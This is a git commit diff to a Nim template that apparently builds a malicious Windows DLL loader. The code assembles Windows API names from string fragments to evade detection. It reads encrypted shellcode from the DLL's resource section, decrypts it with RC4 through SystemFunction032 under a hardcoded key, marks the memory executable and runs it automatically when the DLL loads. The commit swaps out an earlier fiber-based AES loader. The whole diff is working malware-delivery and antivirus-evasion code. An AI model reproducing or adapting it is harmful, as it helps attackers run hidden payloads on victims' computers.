a719bc91afa4ff9ea50d98ae343dcfabaddc5027
RePRGM <92693582+RePRGM@users.noreply.github.com>
2023-01-27 18:09:29 -0500

    Update simpledll.nim

--- templates/simpledll.nim
+++ templates/simpledll.nim
@@ -1,23 +1,32 @@
 import winim
 import nimcrypto
-import DLoader
+import includes/DLoader
+import includes/rc4
 
 func toByteSeq*(str: string): seq[byte] {.inline.} =
   ## Converts a string to the corresponding byte sequence.
   @(str.toOpenArrayByte(0, str.high))
 
-const KERNEL32_DLL* = "kernel32.dll"
+when defined(gcc) and defined(windows):
+  {.link: "resource.o"}
 
-var WPM = ""
-WPM.add("Wr")
-WPM.add("it")
-WPM.add("eP")
-WPM.add("ro")
-WPM.add("ce")
-WPM.add("ss")
-WPM.add("Me")
-WPM.add("mo")
-WPM.add("ry")
+# const encContent = slurp("encContent.bin")
+
+type
+    USTRING* = object
+        Length*: DWORD
+        MaximumLength*: DWORD
+        Buffer*: PVOID
+
+var keyString: USTRING
+var imgString: USTRING
+
+# Same Key
+var keyBuf: array[7, char] = [char 't', 'e', 's', 't', 'K', 'e', 'y']
+
+keyString.Buffer = cast[PVOID](&keyBuf)
+keyString.Length = 16
+keyString.MaximumLength = 16
 
 var VirtAl = ""
 VirtAl.add("Vi")
@@ -37,34 +46,39 @@ VirtPr.add("te")
 VirtPr.add("ct")
 
 type
-    WriteProcessMemory_t* = proc(hProcess: HANDLE, lpBaseAddress: LPVOID, lpBuffer: LPCVOID, nSize: SIZE_T, lpNumberOfBytesWritten: ptr SIZE_T): BOOL {.stdcall.}
-
-type
-    VirtualAlloc_t* = proc(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID {.stdcall.}
-
-type 
+    VirtualAlloc_t* = proc(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID {.stdcall.} 
     VirtualProtect_t* = proc(lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL {.stdcall.}
-
-var WriteProcessMemory_p*: WriteProcessMemory_t
 
 var VirtualAlloc_p*: VirtualAlloc_t
 
 var VirtualProtect_p*: VirtualProtect_t
 var k32Addr: HANDLE = get_library_address() 
 
-WriteProcessMemory_p = cast[WriteProcessMemory_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), WPM)))
 VirtualAlloc_p = cast[VirtualAlloc_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), VirtAl)))
 VirtualProtect_p = cast[VirtualProtect_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), VirtPr)))
 
-proc CreateF*(dwStackSize: SIZE_T, lpStartAddress: LPFIBER_START_ROUTINE, lpParameter: LPVOID): LPVOID {.discardable, stdcall, dynlib: "kernel32", importc: "CreateFiber".}
-proc SwitchToF*(lpFiber: LPVOID): VOID {.discardable, stdcall, dynlib: "kernel32", importc: "SwitchToFiber".}
-proc ConvertTToF*(lpParameter: LPVOID): LPVOID {.discardable, stdcall, dynlib: "kernel32", importc: "ConvertThreadToFiber".}
+#let shellcode: seq[byte] = 
+# let shellcode: seq[byte] = encContent.toByteSeq
+
+var resourceId = 3
+var resourceType = 10
+
+# Get pointer to encrypted shellcode in .rsrc section
+var myResource: HRSRC = FindResource(cast[HMODULE](NULL), MAKEINTRESOURCE(resourceId), MAKEINTRESOURCE(resourceType))
+
+var myResourceSize: DWORD = SizeofResource(cast[HMODULE](NULL), myResource)
+
+var hResource: HGLOBAL = LoadResource(cast[HMODULE](NULL), myResource)
+
+var shellcode = LockResource(hResource)
 
 proc NimMain() {.cdecl, importc.}
 
 proc execute(): void =
-    let shellcode: seq[byte] = REPLACE_ME
-    let iv = "BLANK_IV"
+    #let shellcode: seq[byte] = encContent.toByteSeq
+
+    # AES Decrypt - Working
+    #[let iv = "BLANK_IV"
     let passwd = """BLANK_PASSWORD"""
 
     var dctx: CTR[aes256]
@@ -76,24 +90,30 @@ proc execute(): void =
     dctx.init(expandedkey.data, decodedIV)
     dctx.decrypt(shellcode, decShellcode)
     dctx.clear()
+    ]#
 
     var oldProtect: DWORD
-    ConvertTToF(NULL)
-    echo "ConvertToFiber called!"
-    let buffer = VirtualAlloc_p(NULL, cast[SIZE_T](decShellcode.len), MEM_COMMIT, PAGE_READ_WRITE)
-    echo "VirtualAlloc called!"
-    var bytesWritten: SIZE_T
-    let pHandle = GetCurrentProcess()
-    echo "GetCurrentProcess called!"
-    discard WriteProcessMemory_p(pHandle, buffer, unsafeAddr decShellcode[0], cast[SIZE_T](decShellcode.len), addr bytesWritten)
-    echo "WriteProcessMemory called!"
-    discard VirtualProtect_p(buffer, cast[SIZE_T](decShellcode.len), PAGE_EXECUTE, addr oldProtect)
-    let xFiber = CreateF(0, cast[LPFIBER_START_ROUTINE](buffer), NULL)
-    SwitchToF(xFiber)
+
+    let buffer = VirtualAlloc_p(cast[LPVOID](0), cast[SIZE_T](myResourceSize), MEM_COMMIT, PAGE_READ_WRITE)
+    copyMem(buffer, shellcode, myResourceSize)
+
+    imgString.Buffer = buffer
+    imgString.Length = myResourceSize
+    imgString.MaximumLength = myResourceSize
+
+    SystemFunction032(addr imgString, addr keyString)
+    
+    discard VirtualProtect_p(buffer, cast[SIZE_T](myResourceSize), PAGE_EXECUTE_READ, addr oldProtect)
+
+    #let tHandle = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](buffer), NULL, 0, NULL)
+    #WaitForSingleObject(tHandle, INFINITE)
+    # Works
+    let f = cast[proc(){.nimcall.}](buffer)
+    f()
+    
 
 proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
   NimMain()
-  
   if fdwReason == DLL_PROCESS_ATTACH:
     execute()
 
